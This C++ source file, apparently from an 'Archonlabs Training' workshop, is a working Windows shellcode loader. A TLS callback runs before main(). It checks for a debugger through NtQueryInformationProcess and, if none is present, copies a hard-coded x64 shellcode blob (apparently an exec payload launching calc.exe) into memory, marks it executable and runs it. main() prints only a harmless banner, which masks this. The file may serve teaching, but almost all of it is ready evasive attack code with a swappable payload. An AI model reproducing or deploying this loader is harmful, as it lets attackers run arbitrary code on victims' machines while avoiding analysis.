/*
    Archonlabs Training

Compile:
    $ cl code.cpp
*/

#include <windows.h>
#include <stdint.h>
#include <stdio.h>

VOID callback (PVOID handle, DWORD reason, PVOID reserved);

#pragma comment(linker,"/INCLUDE:_tls_used")
#pragma comment(linker,"/INCLUDE:ptr_callback")
#pragma const_seg(push)
#pragma const_seg(".CRT$XLB")
EXTERN_C const PIMAGE_TLS_CALLBACK ptr_callback = callback;
#pragma const_seg(pop)


bool isdebugged ()
{
    typedef NTSTATUS(WINAPI * pNtQueryInformationProcess)(HANDLE, UINT, PVOID, ULONG, PULONG);

    /* Dapatkan address ke function */
    auto   dll      = GetModuleHandle("ntdll.dll");
    void * procaddr = GetProcAddress(dll, "NtQueryInformationProcess");
    auto fnNtQueryInfoProcess = static_cast<pNtQueryInformationProcess>(procaddr);
    if (fnNtQueryInfoProcess == nullptr)
        return false;

    /* Set ProcessInformationClass menjadi 0x1F (ProcessDebugFlags) */
    const int procinfoclass = 0x1F;

    NTSTATUS  status;
    DWORD     procinfo;
    
    status = fnNtQueryInfoProcess(GetCurrentProcess(), procinfoclass, &procinfo, sizeof(procinfo), NULL);
    return (status == 0x00000000 && procinfo == 0);
}

VOID callback (PVOID handle, DWORD reason, PVOID reserved)
{
    void *      runtime;
    DWORD       old_protect = 0;
    uint8_t     payload []  =     "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
    "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
    "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
    "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
    "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
    "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
    "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
    "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
    "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
    "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
    "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
    "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
    "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
    "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
    "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
    "\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
    "\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
    "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
    "\x63\x2e\x65\x78\x65\x00";
    uint32_t    payload_len = 276;

    // check if we are under debug
    if (reason == DLL_PROCESS_ATTACH && !isdebugged())
    {
        // allocate bffer for payload as READ-WRITE (no executable)
        runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        // copy payload to the buffer
        RtlMoveMemory (runtime, payload, payload_len);

        // make buffer executable (R-X)
        VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);

        int (*func)() = (int (*)())runtime;
        func();

        // deallocate the space
        VirtualFree (runtime, payload_len, MEM_RELEASE);
    }
}


int main()
{
    printf(" ============= *** ============= \n");
    printf(" >     Archonlabs Training     < \n");
    printf(" >        Mini Workshop        < \n");
    printf(" > =========================== < \n");

    return 0;
}